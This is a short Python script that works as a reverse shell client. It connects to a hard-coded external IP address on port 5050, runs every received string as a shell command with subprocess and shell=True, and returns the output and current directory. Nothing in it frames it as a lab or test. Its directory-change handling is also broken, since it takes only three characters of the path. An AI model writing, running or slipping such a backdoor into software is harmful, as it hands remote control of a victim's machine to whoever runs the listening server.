import os
import socket
import subprocess


HEADER = 64
PORT = 5050
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
#"169.254.1.167"
SERVER = "41.190.3.59"
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


while True:
    data = client.recv(1024)
    if data[:2].decode(FORMAT) == 'cd':
        os.chdir(data[:3].decode(FORMAT))
    if len(data) > 0:
        cmd= subprocess.Popen(data[:].decode(FORMAT), shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, FORMAT)
        client.send(str.encode(output_str + str(os.getcwd())))

        #client.send(str.encode(output_str + str(os.getcwd()) + '>'))
        print(output_str)


# close connection
client.close()